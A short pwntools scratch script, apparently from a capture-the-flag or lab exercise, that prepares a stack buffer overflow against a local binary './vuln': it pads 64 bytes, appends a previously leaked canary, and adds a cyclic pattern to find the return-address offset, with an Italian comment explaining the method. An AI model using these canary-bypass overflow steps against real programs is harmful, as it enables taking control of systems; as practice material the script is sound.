#!/usr/bin/env python3

from pwn import *

# # Your discovered canary
# taken = b'TWET'  # Replace with your actual canary if different

# # Create cyclic pattern to identify offset
pattern = cyclic(100)

# io = process('./vuln')
# io.recvuntil(b'> ')

# # Calculate size: buffer(64) + canary(4) + pattern length
# size = str(64 + 4 + len(pattern)).encode()
# io.sendline(size)

# io.recvuntil(b'Input> ')

# # Build payload: buffer + canary + pattern
# payload = b'A' * 64      # Fill buffer
# payload += taken         # Add correct canary
# payload += pattern       # Add pattern to find EIP offset

# io.sendline(payload)
# io.interactive()

from pwn import *
print(cyclic_find(0x61616165))

idea di fondo:
lancio il programma con il canary gia' trovato e poi riempio dopo di una sequenza ciclica
cosi' facendo causo un segfault e con sudo dmesg posso ottenere l'offset canary - eip
